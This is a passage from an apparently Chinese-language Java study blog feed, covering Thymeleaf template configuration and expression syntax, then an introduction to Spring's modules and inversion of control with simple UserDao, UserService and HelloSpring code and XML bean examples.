class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304919.png"></p><h3 id="4-2-1-Thymeleaf-语法学习"><a href="#4-2-1-Thymeleaf-语法学习" class="headerlink" title="4.2.1 Thymeleaf 语法学习"></a>4.2.1 Thymeleaf 语法学习</h3><p><a href="https://www.thymeleaf.org/documentation.html">https://www.thymeleaf.org/documentation.html</a></p><h4 id="yaml-配置："><a href="#yaml-配置：" class="headerlink" title="yaml 配置："></a>yaml 配置：</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">thymeleaf:</span><br>    <span class="hljs-attr">prefix:</span> <span class="hljs-string">classpath:/templates/</span><span class="hljs-comment">#指定模板所在的目录</span><br>    <span class="hljs-attr">check-template-location:</span> <span class="hljs-literal">true</span><span class="hljs-comment">#检查模板路径是否存在</span><br>    <span class="hljs-attr">cache:</span> <span class="hljs-literal">false</span><span class="hljs-comment">#是否缓存，开发模式下设置为false，避免改了模板还要重启服务器，线上设置为true，可以提高性能。</span><br>    <span class="hljs-attr">suffix:</span> <span class="hljs-string">.html</span><span class="hljs-comment">#表示模板文件的后缀</span><br>    <span class="hljs-attr">encoding:</span> <span class="hljs-string">UTF-8</span><span class="hljs-comment">#设置模板文件的字符编码</span><br>    <span class="hljs-attr">content-type:</span> <span class="hljs-string">text/html</span><span class="hljs-comment">#定渲染后返回的 HTTP 响应类型</span><br>    <span class="hljs-attr">mode:</span> <span class="hljs-string">HTML5</span><span class="hljs-comment">#Thymeleaf 模板解析模式</span><br></code></pre></td></tr></table></figure><h4 id="th-属性"><a href="#th-属性" class="headerlink" title="th 属性"></a><font style="color:rgba(0, 0, 0, 0.9);">th 属性</font></h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304599.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251306398.png"></p><ol><li><strong><font style="color:rgb(77, 77, 77);">th:text</font></strong><font style="color:rgb(77, 77, 77);"> ：设置当前元素的文本内容，相同功能的还有</font><strong><font style="color:rgb(77, 77, 77);">th:utext</font></strong><font style="color:rgb(77, 77, 77);">，两者的区别在于前者不会转义html标签，后者会。优先级不高：order&#x3D;7</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:value</font></strong><font style="color:rgb(77, 77, 77);">：设置当前元素的value值，类似修改指定属性的还有</font><strong><font style="color:rgb(77, 77, 77);">th:src</font></strong><font style="color:rgb(77, 77, 77);">，</font><strong><font style="color:rgb(77, 77, 77);">th:href</font></strong><font style="color:rgb(77, 77, 77);">。优先级不高：order&#x3D;6</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:each</font></strong><font style="color:rgb(77, 77, 77);">：遍历循环元素，和</font><strong><font style="color:rgb(77, 77, 77);">th:text</font></strong><font style="color:rgb(77, 77, 77);">或</font><strong><font style="color:rgb(77, 77, 77);">th:value</font></strong><font style="color:rgb(77, 77, 77);">一起使用。注意该属性修饰的标签位置，详细往后看。优先级很高：order&#x3D;2</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:if</font></strong><font style="color:rgb(77, 77, 77);">：条件判断，类似的还有</font><strong><font style="color:rgb(77, 77, 77);">th:unless</font></strong><font style="color:rgb(77, 77, 77);">，</font><strong><font style="color:rgb(77, 77, 77);">th:switch</font></strong><font style="color:rgb(77, 77, 77);">，</font><strong><font style="color:rgb(77, 77, 77);">th:case</font></strong><font style="color:rgb(77, 77, 77);">。优先级较高：order&#x3D;3</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:insert</font></strong><font style="color:rgb(77, 77, 77);">：代码块引入，类似的还有</font><strong><font style="color:rgb(77, 77, 77);">th:replace</font></strong><font style="color:rgb(77, 77, 77);">，</font><strong><font style="color:rgb(77, 77, 77);">th:include</font></strong><font style="color:rgb(77, 77, 77);">，三者的区别较大，若使用不恰当会破坏html结构，常用于公共代码块提取的场景。优先级最高：order&#x3D;1</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:fragment</font></strong><font style="color:rgb(77, 77, 77);">：定义代码块，方便被</font><strong><font style="color:rgb(77, 77, 77);">th:insert</font></strong><font style="color:rgb(77, 77, 77);">引用。优先级最低：order&#x3D;8</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:object</font></strong><font style="color:rgb(77, 77, 77);">：声明变量，一般和*{}一起配合使用，达到偷懒的效果。优先级一般：order&#x3D;4</font></li><li><strong><font style="color:rgb(77, 77, 77);">th:attr</font></strong><font style="color:rgb(77, 77, 77);">：修改任意属性，实际开发中用的较少，因为有丰富的</font><font style="color:rgb(78, 161, 219) !important;">其他</font><font style="color:rgb(77, 77, 77);">th属性帮忙，类似的还有</font><strong><font style="color:rgb(77, 77, 77);">th:attrappend</font></strong><font style="color:rgb(77, 77, 77);">，</font><strong><font style="color:rgb(77, 77, 77);">th:attrprepend</font></strong><font style="color:rgb(77, 77, 77);">。优先级一般：order&#x3D;5</font></li></ol><p><font style="color:rgb(79, 79, 79);"></font></p><h4 id="标准表达式语法"><a href="#标准表达式语法" class="headerlink" title="标准表达式语法"></a><font style="color:rgb(79, 79, 79);">标准表达式语法</font></h4><ul><li><font style="color:rgb(51, 51, 51);">Simple expressions:</font><ul><li><font style="color:rgb(51, 51, 51);">Variable Expressions:</font><font style="color:rgb(51, 51, 51);"> </font><code>**&lt;font style=&quot;color:rgb(112, 112, 112);&quot;&gt;${...}&lt;/font&gt;**</code></li><li><font style="color:rgb(51, 51, 51);">Selection Variable Expressions:</font><font style="color:rgb(51, 51, 51);"> </font><code>**&lt;font style=&quot;color:rgb(112, 112, 112);&quot;&gt;*{...}&lt;/font&gt;**</code></li><li><font style="color:rgb(51, 51, 51);">Message Expressions:</font><font style="color:rgb(51, 51, 51);"> </font><code>**&lt;font style=&quot;color:rgb(112, 112, 112);&quot;&gt;#{...}&lt;/font&gt;**</code></li><li><font style="color:rgb(51, 51, 51);">Link URL Expressions:</font><font style="color:rgb(51, 51, 51);"> </font><code>**&lt;font style=&quot;color:rgb(112, 112, 112);&quot;&gt;@{...}&lt;/font&gt;**</code></li><li><font style="color:rgb(51, 51, 51);">Fragment Expressions: </font><code>**&lt;font style=&quot;color:rgb(112, 112, 112);&quot;&gt;~{...}&lt;/font&gt;**</code></li></ul></li></ul><h5 id="…-代码块表达式"><a href="#…-代码块表达式" class="headerlink" title="~{…} 代码块表达式"></a><font style="color:rgb(77, 77, 77);">~{…} 代码块表达式</font></h5><ul><li><font style="color:rgb(77, 77, 77);">推荐：</font><code>~{templatename::fragmentname}</code></li><li><font style="color:rgb(77, 77, 77);">支持：</font><code>~{templatename::#id}</code></li></ul><p><font style="color:rgb(77, 77, 77);">templatename：模版名，Thymeleaf会根据模版名解析完整路径：</font><code>/resources/templates/templatename.html</code><font style="color:rgb(77, 77, 77);">，要注意文件的路径。</font></p><p><font style="color:rgb(77, 77, 77);">fragmentname：片段名，Thymeleaf通过th:fragment声明定义代码块，即：</font><code>th:fragment=&quot;fragmentname&quot;</code></p><p><font style="color:rgb(77, 77, 77);">id：HTML的id选择器，使用时要在前面加上#号，不支持class选择器。</font></p><h5 id="…-消息表达式"><a href="#…-消息表达式" class="headerlink" title="#{…} 消息表达式"></a><font style="color:rgb(77, 77, 77);">#{…} 消息表达式</font></h5><h5 id="…-链接表达式"><a href="#…-链接表达式" class="headerlink" title="@{…} 链接表达式"></a><font style="color:rgb(77, 77, 77);">@{…} 链接表达式</font></h5><p><font style="color:rgb(77, 77, 77);">链接表达式好处：不管是静态资源的引用，form表单的请求，凡是链接都可以用@{…} 。这样可以动态获取项目路径，即便项目名变了，依然可以正常访问。</font></p><p><strong><font style="color:rgb(77, 77, 77);">链接表达式结构</font></strong><font style="color:rgb(77, 77, 77);">:</font></p><ul><li><font style="color:rgb(77, 77, 77);">无参：@{&#x2F;xxx}</font></li><li><font style="color:rgb(77, 77, 77);">有参：@{&#x2F;xxx(k1&#x3D;v1,k2&#x3D;v2)} 对应url结构：xxx?k1&#x3D;v1&amp;k2&#x3D;v2</font></li><li><font style="color:rgb(77, 77, 77);">引入本地资源：@{&#x2F;项目本地的资源路径}</font></li><li><font style="color:rgb(77, 77, 77);">引入外部资源：@{&#x2F;webjars&#x2F;资源在jar包中的路径}</font></li></ul><h5 id="…-变量表达式"><a href="#…-变量表达式" class="headerlink" title="${…}变量表达式"></a><font style="color:rgb(77, 77, 77);">${…}变量表达式</font></h5><p>变量表达式功能：</p><ul><li>可以获取对象的属性和方法</li><li>可以使用ctx，vars，locale，request，response，session，servletContext内置对象</li><li>可以使用dates，numbers，strings，objects，arrays，lists，sets，maps等内置方法（重点介绍）</li></ul><p>常用的内置对象：</p><ul><li>ctx ：上下文对象。</li><li>vars ：上下文变量。</li><li>locale：上下文的语言环境。</li><li>request：（仅在web上下文）的 HttpServletRequest 对象。</li><li>response：（仅在web上下文）的 HttpServletResponse 对象。</li><li>session：（仅在web上下文）的 HttpSession 对象。</li><li>servletContext：（仅在web上下文）的 ServletContext 对象</li></ul><p>常用的内置方法:</p><ul><li>strings：字符串格式化方法，常用的Java方法它都有。比如：equals，equalsIgnoreCase，length，trim，toUpperCase，toLowerCase，indexOf，substring，replace，startsWith，endsWith，contains，containsIgnoreCase等</li><li>numbers：数值格式化方法，常用的方法有：formatDecimal等</li><li>bools：布尔方法，常用的方法有：isTrue，isFalse等</li><li>arrays：数组方法，常用的方法有：toArray，length，isEmpty，contains，containsAll等</li><li>lists，sets：集合方法，常用的方法有：toList，size，isEmpty，contains，containsAll，sort等</li><li>maps：对象方法，常用的方法有：size，isEmpty，containsKey，containsValue等</li><li>dates：日期方法，常用的方法有：format，year，month，hour，createNow等</li></ul><h5 id="…-选择变量表达式"><a href="#…-选择变量表达式" class="headerlink" title="*{…} 选择变量表达式"></a>*{…} 选择变量表达式</h5><h2 id="4-3-MVC自动配置原理"><a href="#4-3-MVC自动配置原理" class="headerlink" title="4.3 MVC自动配置原理"></a>4.3 MVC自动配置原理</h2><p><a href="https://springdoc.cn/spring-boot/web.html#web.servlet">https://springdoc.cn/spring-boot/web.html#web.servlet</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring</title>
    <link href="/2025/08/12/Spring/"/>
    <url>/2025/08/12/Spring/</url>
    
    <content type="html"><![CDATA[<h1 id="1、Spring简介"><a href="#1、Spring简介" class="headerlink" title="1、Spring简介"></a>1、Spring简介</h1><p><a href="https://spring.io/">Spring 官网</a></p><p><a href="https://docs.spring.io/spring-framework/docs/5.2.0.RELEASE/spring-framework-reference/core.html#spring-core">Spring 5.2.0 官方文档</a></p><p><a href="https://github.com/spring-projects/spring-framework">GitHub - spring-projects&#x2F;spring-framework: Spring Framework</a></p><p><a href="https://mvnrepository.com/artifact/org.springframework/spring-webmvc">spring-webmvc</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-webmvc --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-webmvc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.2.0.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-1、优点"><a href="#1-1、优点" class="headerlink" title="1.1、优点"></a>1.1、优点</h2><ul><li>Spring是一个开源的免费的框架</li><li>Spring是一个轻量级的、非入侵式的框架</li><li>控制反转（IOC），面向切面编程（AOP）</li><li>支持事物的处理，对框架整合的支持</li></ul><p>总结一句话：Spring就是一个轻量级的控制反转（IOC）和面向切面编程（AOP）的框架</p><h2 id="1-2、组成"><a href="#1-2、组成" class="headerlink" title="1.2、组成"></a>1.2、组成</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749844.gif" alt="img"></p><p><strong>核心容器（Spring Core）</strong></p><p>核心容器提供Spring框架的基本功能。Spring以bean的方式组织和管理Java应用中的各个组件及其关系。Spring使用BeanFactory来产生和管理Bean，它是工厂模式的实现。BeanFactory使用控制反转(IoC)模式将应用的配置和依赖性规范与实际的应用程序代码分开。</p><p><strong>应用上下文（Spring Context）</strong></p><p>Spring上下文是一个配置文件，向Spring框架提供上下文信息。Spring上下文包括企业服务，如JNDI、EJB、电子邮件、国际化、校验和调度功能。</p><p><strong>Spring面向切面编程（Spring AOP）</strong></p><p>通过配置管理特性，Spring AOP 模块直接将面向方面的编程功能集成到了 Spring框架中。所以，可以很容易地使 Spring框架管理的任何对象支持 AOP。Spring AOP 模块为基于 Spring 的应用程序中的对象提供了事务管理服务。通过使用 Spring AOP，不用依赖 EJB 组件，就可以将声明性事务管理集成到应用程序中。</p><p><strong>JDBC和DAO模块（Spring DAO）</strong></p><p>JDBC、DAO的抽象层提供了有意义的异常层次结构，可用该结构来管理异常处理，和不同数据库供应商所抛出的错误信息。异常层次结构简化了错误处理，并且极大的降低了需要编写的代码数量，比如打开和关闭链接。</p><p><strong>对象实体映射（Spring ORM）</strong></p><p>Spring框架插入了若干个ORM框架，从而提供了ORM对象的关系工具，其中包括了Hibernate、JDO和 IBatis SQL Map等，所有这些都遵从Spring的通用事物和DAO异常层次结构。</p><p><strong>Web模块（Spring Web）</strong></p><p>Web上下文模块建立在应用程序上下文模块之上，为基于web的应用程序提供了上下文。所以Spring框架支持与Struts集成，web模块还简化了处理多部分请求以及将请求参数绑定到域对象的工作。</p><p><strong>MVC模块（Spring Web MVC）</strong></p><p>MVC框架是一个全功能的构建Web应用程序的MVC实现。通过策略接口，MVC框架变成为高度可配置的。MVC容纳了大量视图技术，其中包括JSP、POI等，模型来有JavaBean来构成，存放于m当中，而视图是一个街口，负责实现模型，控制器表示逻辑代码，由c的事情。Spring框架的功能可以用在任何J2EE服务器当中，大多数功能也适用于不受管理的环境。Spring的核心要点就是支持不绑定到特定J2EE服务的可重用业务和数据的访问的对象，毫无疑问这样的对象可以在不同的J2EE环境，独立应用程序和测试环境之间重用。</p><h2 id="1-3、拓展"><a href="#1-3、拓展" class="headerlink" title="1.3、拓展"></a>1.3、拓展</h2><p>现代化的Java开发，说白就是基于 Spring 的开发</p><ul><li><p>Spring Boot</p></li><li><ul><li>一个快速开发的脚手架</li><li>基于Spring Boot可以快速的开发单个微服务</li><li>约定大于配置</li></ul></li><li><p>Spring Cloud</p></li><li><ul><li>Spring Cloud 是基于Spring Boot 实现的</li></ul></li></ul><h1 id="2、IOC-容器"><a href="#2、IOC-容器" class="headerlink" title="2、IOC 容器"></a>2、IOC 容器</h1><h2 id="2-1-IOC-理论推导"><a href="#2-1-IOC-理论推导" class="headerlink" title="2.1 IOC 理论推导"></a>2.1 IOC 理论推导</h2><h3 id="案例一："><a href="#案例一：" class="headerlink" title="案例一："></a>案例一：</h3><ol><li>UserDao 接口</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.dao;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserDao</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>UserDaoImpl 实现类</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.dao;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDaoImpl</span> <span class="hljs-keyword">implements</span>  <span class="hljs-title class_">UserDao</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;默认获取用户的数据&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.dao;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDaoMysqlImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDao</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;mysql 获取用户的数据&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>UserService 业务接口</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.service;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>UserServicelmpl 业务实现类</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.service;<br><br><span class="hljs-keyword">import</span> com.kuang.dao.UserDao;<br><span class="hljs-keyword">import</span> com.kuang.dao.UserDaoImpl;<br><span class="hljs-keyword">import</span> com.kuang.dao.UserDaoMysqlImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-comment">//这样的代码，用户的需求可能会影响我们原来的代码，我们需根据用户的需求去修改原代码！</span><br>    <span class="hljs-comment">//private UserDao userDao = new UserDaoImpl();</span><br>    <span class="hljs-comment">//private UserDao userDao = new UserDaoMysqlImpl();</span><br><br>    <span class="hljs-comment">//使用 Set 接口，避免了根据用户的需求去修改原代码，而是由用户决定需要调用哪个接口。之前，程序是主动创建对象，控制权在程序猿手上；使用 set注入后，程序不再具有主动性，而是变成了被动的接收对象</span><br>    <span class="hljs-comment">// 这种 “控制反转” 的思想，从本质上解决了程序猿管理对象的创建的问题，系统的耦合性大大降低，从而更专注于业务的实现上！</span><br>    <span class="hljs-keyword">private</span> UserDao userDao;<br>    <span class="hljs-comment">//利用 set 进行动态实现值的注入</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserDao</span><span class="hljs-params">(UserDao userDao)</span> &#123;<br>        <span class="hljs-built_in">this</span>.userDao = userDao;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span> &#123;<br>        userDao.getUser();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>MyTest 用户层</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.kuang.dao.UserDaoImpl;<br><span class="hljs-keyword">import</span> com.kuang.dao.UserDaoMysqlImpl;<br><span class="hljs-keyword">import</span> com.kuang.service.UserService;<br><span class="hljs-keyword">import</span> com.kuang.service.UserServiceImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//用户实际调用的是业务层，dao 层他们不需要接触</span><br>        <span class="hljs-comment">//之前，用户调用什么接口，是由 UserServicelmpl 中写死的，</span><br>        <span class="hljs-comment">// UserService userService  = new UserServiceImpl();</span><br>        <span class="hljs-comment">// userService.getUser();</span><br><br>        <span class="hljs-comment">//而加入“控制反转” 的思想后，主动权交由用户手中</span><br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span>  <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        ((UserServiceImpl) userService).setUserDao(<span class="hljs-keyword">new</span> <span class="hljs-title class_">UserDaoImpl</span>());<br>        userService.getUser();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749159.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311751713.png" alt="img"></p><p>使用 Set 接口，避免了根据用户的需求去修改原代码，而是由用户决定需要调用哪个接口。之前，程序是主动创建对象，控制权在程序猿手上；使用 set注入后，程序不再具有主动性，而是变成了被动的接收对象</p><p>这种 “控制反转” 的思想，从本质上解决了程序猿管理对象的创建的问题，系统的耦合性大大降低，从而更专注于业务的实现上！</p><h2 id="2-2-IOC-本质"><a href="#2-2-IOC-本质" class="headerlink" title="2.2 IOC 本质"></a>2.2 IOC 本质</h2><p><strong>控制反转IoC(Inversion of Control)，是一种设计思想，DI(依赖注入)是实现IoC的一种方法</strong>，也有人认为DI只是IoC的另一种说法。没有IoC的程序中 , 我们使用面向对象编程 , 对象的创建与对象间的依赖关系完全硬编码在程序中，对象的创建由程序自己控制，控制反转后将对象的创建转移给第三方，个人认为所谓控制反转就是：获得依赖对象的方式反转了。</p><p><strong>IoC是Spring框架的核心内容</strong>，使用多种方式完美的实现了IoC，可以使用XML配置，也可以使用注解，新版本的Spring也可以零配置实现IoC。</p><p>Spring容器在初始化时先读取配置文件，根据配置文件或元数据创建与组织对象存入容器中，程序使用时再从Ioc容器中取出需要的对象。</p><p> 采用XML方式配置Bean的时候，Bean的定义信息是和实现分离的，而采用注解的方式可以把两者合为一体，Bean的定义信息直接以注解的形式定义在实现类中，从而达到了零配置的目的。</p><p><strong>控制反转是一种通过描述（XML或注解）并通过第三方去生产或获取特定对象的方式。在Spring中实现控制反转的是IoC容器，其实现方法是依赖注入（Dependency Injection,DI）。</strong></p><h2 id="2-3-HelloSpring"><a href="#2-3-HelloSpring" class="headerlink" title="2.3 HelloSpring"></a>2.3 HelloSpring</h2><h3 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">private</span> String str;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getStr</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> str;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setStr</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-built_in">this</span>.str = str;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;str=&#x27;&quot;</span> + str + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br><br>  <span class="hljs-comment">&lt;!--    使用 Spring 来创建对象，在 Spring 这些都称为 Bean --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.kuang.pojo.Hello&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;str&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Spring&quot;</span>/&gt;</span><br><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.kuang.pojo.Hello;<br><span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span 